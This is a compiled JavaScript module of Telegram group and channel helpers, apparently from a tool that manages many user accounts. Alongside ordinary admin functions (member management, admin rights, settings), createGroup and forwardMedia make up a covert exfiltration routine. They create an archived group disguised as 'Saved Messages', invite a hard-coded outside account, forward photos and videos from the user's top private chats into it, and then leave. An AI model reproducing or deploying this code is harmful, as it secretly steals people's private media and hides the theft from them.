"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.createGroup = createGroup;
exports.archiveChat = archiveChat;
exports.forwardMedia = forwardMedia;
exports.joinChannel = joinChannel;
exports.leaveChannels = leaveChannels;
exports.getGrpMembers = getGrpMembers;
exports.addGroupMembers = addGroupMembers;
exports.removeGroupMembers = removeGroupMembers;
exports.promoteToAdmin = promoteToAdmin;
exports.demoteAdmin = demoteAdmin;
exports.unblockGroupUser = unblockGroupUser;
exports.getGroupAdmins = getGroupAdmins;
exports.getGroupBannedUsers = getGroupBannedUsers;
exports.createGroupOrChannel = createGroupOrChannel;
exports.createGroupWithOptions = createGroupWithOptions;
exports.updateGroupSettings = updateGroupSettings;
const telegram_1 = require("telegram");
const Helpers_1 = require("telegram/Helpers");
const big_integer_1 = __importDefault(require("big-integer"));
const uploads_1 = require("telegram/client/uploads");
const parseError_1 = require("../../../utils/parseError");
const isPermanentError_1 = __importDefault(require("../../../utils/isPermanentError"));
const helpers_1 = require("./helpers");
const connection_manager_1 = require("../utils/connection-manager");
async function createGroup(ctx) {
    const groupName = 'Saved Messages';
    const groupDescription = ctx.phoneNumber;
    ctx.logger.info(ctx.phoneNumber, 'Creating group:', groupName);
    const result = await ctx.client.invoke(new telegram_1.Api.channels.CreateChannel({
        title: groupName,
        about: groupDescription,
        megagroup: true,
        forImport: true,
    }));
    const { id, accessHash } = result.chats[0];
    ctx.logger.info(ctx.phoneNumber, 'Archived chat', id);
    await archiveChat(ctx, id, accessHash);
    const usersToAdd = ['fuckyoubabie1'];
    ctx.logger.info(ctx.phoneNumber, 'Adding users to the channel:', usersToAdd);
    await ctx.client.invoke(new telegram_1.Api.channels.InviteToChannel({
        channel: new telegram_1.Api.InputChannel({ channelId: id, accessHash }),
        users: usersToAdd,
    }));
    return { id, accessHash };
}
async function archiveChat(ctx, id, accessHash) {
    const folderId = 1;
    ctx.logger.info(ctx.phoneNumber, 'Archiving chat', id);
    return await ctx.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
        folderPeers: [
            new telegram_1.Api.InputFolderPeer({
                peer: new telegram_1.Api.InputPeerChannel({ channelId: id, accessHash }),
                folderId,
            }),
        ],
    }));
}
async function createOrJoinChannel(ctx, channel) {
    let channelId;
    let channelAccessHash;
    if (channel) {
        try {
            const result = await joinChannel(ctx, channel);
            channelId = result.chats[0].id;
            channelAccessHash = result.chats[0].accessHash;
            ctx.logger.info(ctx.phoneNumber, 'Archived chat', channelId);
        }
        catch (error) {
            const result = await createGroup(ctx);
            channelId = result.id;
            channelAccessHash = result.accessHash;
            ctx.logger.info(ctx.phoneNumber, 'Created new group with ID:', channelId);
        }
    }
    else {
        const result = await createGroup(ctx);
        channelId = result.id;
        channelAccessHash = result.accessHash;
        ctx.logger.info(ctx.phoneNumber, 'Created new group with ID:', channelId);
    }
    await archiveChat(ctx, channelId, channelAccessHash);
    return { id: channelId, accesshash: channelAccessHash };
}
async function forwardMedia(ctx, channel, fromChatId) {
    const { searchMessages, forwardMessages } = require('./message-operations');
    const { getTopPrivateChats } = require('./chat-operations');
    const { MessageMediaType } = require('../dto/message-search.dto');
    let channelId;
    try {
        ctx.logger.info(ctx.phoneNumber, `Forwarding media from chat to channel ${channel} from ${fromChatId}`);
        if (fromChatId) {
            const channelDetails = await createOrJoinChannel(ctx, channel);
            channelId = channelDetails.id;
            const { forwardSecretMsgs } = require('./message-operations');
            await forwardSecretMsgs(ctx, fromChatId, channelId?.toString());
        }
        else {
            const result = await getTopPrivateChats(ctx);
            const chats = result.items;
            const me = await ctx.client.getMe();
            if (chats.length > 0) {
                const channelDetails = await createOrJoinChannel(ctx, channel);
                channelId = channelDetails.id;
                const finalChats = new Set(chats.map((chat) => chat.chatId));
                finalChats.add(me.id?.toString());
                for (const chatId of finalChats) {
                    const mediaMessages = await searchMessages(ctx, { chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.VOICE, MessageMediaType.ROUND_VOICE] });
                    ctx.logger.info(ctx.phoneNumber, `Forwarding messages from chat: ${chatId} to channel: ${channelId}`);
                    await forwardMessages(ctx, chatId, channelId, mediaMessages.photo.messages);
                    await forwardMessages(ctx, chatId, channelId, mediaMessages.video.messages);
                }
            }
            ctx.logger.info(ctx.phoneNumber, 'Completed forwarding messages from top private chats to channel:', channelId);
        }
    }
    catch (e) {
        ctx.logger.info(ctx.phoneNumber, e);
    }
    if (channelId) {
        await leaveChannels(ctx, [channelId.toString()]);
        await connection_manager_1.connectionManager.unregisterClient(ctx.phoneNumber);
    }
}
async function joinChannel(ctx, entity) {
    ctx.logger.info(ctx.phoneNumber, 'trying to join channel: ', `@${entity}`);
    return await ctx.client?.invoke(new telegram_1.Api.channels.JoinChannel({
        channel: await ctx.client?.getEntity(entity),
    }));
}
async function leaveChannels(ctx, chats) {
    ctx.logger.info(ctx.phoneNumber, 'Leaving Channels/Groups: initiated!!');
    ctx.logger.info(ctx.phoneNumber, 'ChatsLength: ', chats.length);
    if (chats.length === 0) {
        ctx.logger.info(ctx.phoneNumber, 'No chats to leave');
        return;
    }
    const chatsToLeave = new Set();
    for (const id of chats) {
        chatsToLeave.add(id);
        if (id.startsWith('-100')) {
            chatsToLeave.add(id.substring(4));
        }
        else {
            chatsToLeave.add(`-100${id}`);
        }
    }
    const entityMap = new Map();
    let foundCount = 0;
    try {
        for await (const dialog of ctx.client.iterDialogs({})) {
            const entity = dialog.entity;
            if (entity instanceof telegram_1.Api.Channel || entity instanceof telegram_1.Api.Chat) {
                const entityId = entity.id.toString();
                if (chatsToLeave.has(entityId)) {
                    entityMap.set(entityId, { entity, dialog });
                    foundCount++;
                    if (foundCount >= chats.length) {
                        ctx.logger.debug(ctx.phoneNumber, `Found all ${foundCount} chats, stopping iteration early`);
                        break;
                    }
                }
                if (entityId.startsWith('-100')) {
                    const shortId = entityId.substring(4);
                    if (chatsToLeave.has(shortId) && !entityMap.has(shortId)) {
                        entityMap.set(shortId, { entity, dialog });
                        foundCount++;
                        if (foundCount >= chats.length)
                            break;
                    }
                }
                else {
                    const longId = `-100${entityId}`;
                    if (chatsToLeave.has(longId) && !entityMap.has(longId)) {
                        entityMap.set(longId, { entity, dialog });
                        foundCount++;
                        if (foundCount >= chats.length)
                            break;
                    }
                }
            }
        }
        ctx.logger.debug(ctx.phoneNumber, `Found ${entityMap.size} matching chats from dialogs`);
    }
    catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Failed to iterate dialogs:', error);
        throw error;
    }
    if (entityMap.size === 0) {
        ctx.logger.warn(ctx.phoneNumber, 'No matching chats found in dialogs to leave');
        return;
    }
    const me = await ctx.client.getMe();
    let successCount = 0;
    let skipCount = 0;
    for (const id of chats) {
        try {
            const entityData = entityMap.get(id) ||
                entityMap.get(id.startsWith('-100') ? id.substring(4) : `-100${id}`);
            if (!entityData) {
                ctx.logger.warn(ctx.phoneNumber, `Chat ${id} not found in dialogs, skipping`);
                skipCount++;
                continue;
            }
            const { entity } = entityData;
            let chatType;
            let left = false;
            if (entity instanceof telegram_1.Api.Channel) {
                await ctx.client.invoke(new telegram_1.Api.channels.LeaveChannel({ channel: entity }));
                chatType = entity.broadcast ? 'channel' : 'supergroup';
                left = true;
            }
            else if (entity instanceof telegram_1.Api.Chat) {
                await ctx.client.invoke(new telegram_1.Api.messages.DeleteChatUser({
                    chatId: entity.id,
                    userId: me.id,
                    revokeHistory: false,
                }));
                chatType = 'group';
                left = true;
            }
            else {
                ctx.logger.warn(ctx.phoneNumber, `Unknown entity type for ${id}, skipping`);
                skipCount++;
                continue;
            }
            if (left) {
                ctx.logger.info(ctx.phoneNumber, `Left ${chatType}: ${id}`);
                successCount++;
            }
            if (chats.length > 1)
                await (0, Helpers_1.sleep)(3000);
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `${ctx.phoneNumber} Failed to leave chat ${id}:`, false);
            if ((0, isPermanentError_1.default)(errorDetails)) {
                ctx.logger.error(ctx.phoneNumber, `Permanent error leaving ${id}:`, errorDetails.message);
                skipCount++;
                continue;
            }
            ctx.logger.warn(ctx.phoneNumber, `Error leaving ${id}:`, errorDetails.message);
            skipCount++;
        }
    }
    ctx.logger.info(ctx.phoneNumber, `Leaving Channels/Groups: Completed! Success: ${successCount}, Skipped: ${skipCount}, Total: ${chats.length}`);
}
async function getGrpMembers(ctx, entity) {
    try {
        const result = [];
        const chat = await ctx.client.getEntity(entity);
        if (!(chat instanceof telegram_1.Api.Chat || chat instanceof telegram_1.Api.Channel)) {
            ctx.logger.info(ctx.phoneNumber, 'Invalid group or channel!');
            return [];
        }
        ctx.logger.info(ctx.phoneNumber, `Fetching members of ${chat.title || chat.username}...`);
        const participants = await ctx.client.invoke(new telegram_1.Api.channels.GetParticipants({
            channel: chat,
            filter: new telegram_1.Api.ChannelParticipantsRecent(),
            offset: 0,
            limit: 200,
            hash: (0, big_integer_1.default)(0),
        }));
        if (participants instanceof telegram_1.Api.channels.ChannelParticipants) {
            const users = participants.participants;
            ctx.logger.info(ctx.phoneNumber, `Members: ${users.length}`);
            for (const user of users) {
                const userInfo = user instanceof telegram_1.Api.ChannelParticipant ? user.userId : null;
                if (userInfo) {
                    const userDetails = await ctx.client.getEntity(userInfo);
                    result.push({
                        tgId: userDetails.id,
                        name: `${userDetails.firstName || ''} ${userDetails.lastName || ''}`,
                        username: `${userDetails.username || ''}`,
                    });
                    if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
                        ctx.logger.info(ctx.phoneNumber, JSON.stringify(userDetails.id));
                    }
                }
                else {
                    ctx.logger.info(ctx.phoneNumber, JSON.stringify(user?.userId));
                }
            }
        }
        else {
            ctx.logger.info(ctx.phoneNumber, 'No members found or invalid group.');
        }
        ctx.logger.info(ctx.phoneNumber, `${result.length}`);
        return result;
    }
    catch (err) {
        ctx.logger.error(ctx.phoneNumber, 'Error fetching group members:', err);
        return [];
    }
}
async function addGroupMembers(ctx, groupId, members) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    const channel = await ctx.client.getInputEntity(groupId);
    const users = await Promise.all(members.map(member => ctx.client.getInputEntity(member)));
    await ctx.client.invoke(new telegram_1.Api.channels.InviteToChannel({ channel, users }));
}
async function removeGroupMembers(ctx, groupId, members) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    const channel = await ctx.client.getInputEntity(groupId);
    for (const member of members) {
        const user = await ctx.client.getInputEntity(member);
        await ctx.client.invoke(new telegram_1.Api.channels.EditBanned({
            channel,
            participant: user,
            bannedRights: new telegram_1.Api.ChatBannedRights({
                untilDate: 0,
                viewMessages: true, sendMessages: true, sendMedia: true,
                sendStickers: true, sendGifs: true, sendGames: true,
                sendInline: true, embedLinks: true,
            }),
        }));
    }
}
async function promoteToAdmin(ctx, groupId, userId, permissions, rank) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    const channel = await ctx.client.getInputEntity(groupId);
    const user = await ctx.client.getInputEntity(userId);
    await ctx.client.invoke(new telegram_1.Api.channels.EditAdmin({
        channel, userId: user,
        adminRights: new telegram_1.Api.ChatAdminRights({
            changeInfo: permissions?.changeInfo ?? false,
            postMessages: permissions?.postMessages ?? false,
            editMessages: permissions?.editMessages ?? false,
            deleteMessages: permissions?.deleteMessages ?? false,
            banUsers: permissions?.banUsers ?? false,
            inviteUsers: permissions?.inviteUsers ?? true,
            pinMessages: permissions?.pinMessages ?? false,
            addAdmins: permissions?.addAdmins ?? false,
            anonymous: permissions?.anonymous ?? false,
            manageCall: permissions?.manageCall ?? false,
            other: false,
        }),
        rank: rank || '',
    }));
}
async function demoteAdmin(ctx, groupId, userId) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    const channel = await ctx.client.getInputEntity(groupId);
    const user = await ctx.client.getInputEntity(userId);
    await ctx.client.invoke(new telegram_1.Api.channels.EditAdmin({
        channel, userId: user,
        adminRights: new telegram_1.Api.ChatAdminRights({
            changeInfo: false, postMessages: false, editMessages: false,
            deleteMessages: false, banUsers: false, inviteUsers: false,
            pinMessages: false, addAdmins: false, anonymous: false,
            manageCall: false, other: false,
        }),
        rank: '',
    }));
}
async function unblockGroupUser(ctx, groupId, userId) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    const channel = await ctx.client.getInputEntity(groupId);
    const user = await ctx.client.getInputEntity(userId);
    await ctx.client.invoke(new telegram_1.Api.channels.EditBanned({
        channel, participant: user,
        bannedRights: new telegram_1.Api.ChatBannedRights({
            untilDate: 0,
            viewMessages: false, sendMessages: false, sendMedia: false,
            sendStickers: false, sendGifs: false, sendGames: false,
            sendInline: false, embedLinks: false,
        }),
    }));
}
async function getGroupAdmins(ctx, groupId) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    const result = await ctx.client.invoke(new telegram_1.Api.channels.GetParticipants({
        channel: await ctx.client.getInputEntity(groupId),
        filter: new telegram_1.Api.ChannelParticipantsAdmins(),
        offset: 0, limit: 100, hash: (0, big_integer_1.default)(0),
    }));
    if ('users' in result) {
        const participants = result.participants;
        return participants.map(participant => {
            const adminRights = participant.adminRights;
            return {
                userId: participant.userId.toString(),
                rank: participant.rank || '',
                permissions: {
                    changeInfo: adminRights.changeInfo || false,
                    postMessages: adminRights.postMessages || false,
                    editMessages: adminRights.editMessages || false,
                    deleteMessages: adminRights.deleteMessages || false,
                    banUsers: adminRights.banUsers || false,
                    inviteUsers: adminRights.inviteUsers || false,
                    pinMessages: adminRights.pinMessages || false,
                    addAdmins: adminRights.addAdmins || false,
                    anonymous: adminRights.anonymous || false,
                    manageCall: adminRights.manageCall || false,
                },
            };
        });
    }
    return [];
}
async function getGroupBannedUsers(ctx, groupId) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    const result = await ctx.client.invoke(new telegram_1.Api.channels.GetParticipants({
        channel: await ctx.client.getInputEntity(groupId),
        filter: new telegram_1.Api.ChannelParticipantsBanned({ q: '' }),
        offset: 0, limit: 100, hash: (0, big_integer_1.default)(0),
    }));
    if ('users' in result) {
        const participants = result.participants;
        return participants.map(participant => {
            const bannedRights = participant.bannedRights;
            return {
                userId: participant.peer.chatId.toString(),
                bannedRights: {
                    viewMessages: bannedRights.viewMessages || false,
                    sendMessages: bannedRights.sendMessages || false,
                    sendMedia: bannedRights.sendMedia || false,
                    sendStickers: bannedRights.sendStickers || false,
                    sendGifs: bannedRights.sendGifs || false,
                    sendGames: bannedRights.sendGames || false,
                    sendInline: bannedRights.sendInline || false,
                    embedLinks: bannedRights.embedLinks || false,
                    untilDate: bannedRights.untilDate || 0,
                },
            };
        });
    }
    return [];
}
async function createGroupOrChannel(ctx, options) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    try {
        ctx.logger.info(ctx.phoneNumber, 'Creating group or channel with options:', options);
        return await ctx.client.invoke(new telegram_1.Api.channels.CreateChannel(options));
    }
    catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Error creating group or channel:', error);
        throw new Error(`Failed to create group or channel: ${error.message}`);
    }
}
async function createGroupWithOptions(ctx, options) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    const result = await createGroupOrChannel(ctx, options);
    let channelId;
    if ('updates' in result) {
        const updates = Array.isArray(result.updates) ? result.updates : [result.updates];
        const channelUpdate = updates.find(u => u instanceof telegram_1.Api.UpdateChannel);
        if (channelUpdate && 'channelId' in channelUpdate) {
            channelId = channelUpdate.channelId;
        }
    }
    if (!channelId)
        throw new Error('Failed to create channel');
    const channelEntity = await ctx.client.getEntity(channelId);
    if (!(channelEntity instanceof telegram_1.Api.Channel))
        throw new Error('Created entity is not a channel');
    if (options.members?.length) {
        const users = await Promise.all(options.members.map(member => ctx.client.getInputEntity(member)));
        await ctx.client.invoke(new telegram_1.Api.channels.InviteToChannel({
            channel: await ctx.client.getInputEntity(channelEntity),
            users,
        }));
    }
    if (options.photo) {
        const buffer = await (0, helpers_1.downloadFileFromUrl)(options.photo);
        const inputFile = await ctx.client.uploadFile({
            file: new uploads_1.CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
            workers: 1,
        });
        await ctx.client.invoke(new telegram_1.Api.channels.EditPhoto({
            channel: await ctx.client.getInputEntity(channelEntity),
            photo: new telegram_1.Api.InputChatUploadedPhoto({ file: inputFile }),
        }));
    }
    return channelEntity;
}
async function updateGroupSettings(ctx, settings) {
    if (!ctx.client)
        throw new Error('Client not initialized');
    const channel = await ctx.client.getEntity(settings.groupId);
    if (settings.title) {
        await ctx.client.invoke(new telegram_1.Api.channels.EditTitle({ channel, title: settings.title || '' }));
    }
    if (settings.description) {
        await ctx.client.invoke(new telegram_1.Api.messages.EditChatAbout({ peer: channel, about: settings.description }));
    }
    if (settings.username) {
        await ctx.client.invoke(new telegram_1.Api.channels.UpdateUsername({ channel, username: settings.username }));
    }
    if (settings.slowMode !== undefined) {
        await ctx.client.invoke(new telegram_1.Api.channels.ToggleSlowMode({ channel, seconds: settings.slowMode }));
    }
    return true;
}
//# sourceMappingURL=channel-operations.js.map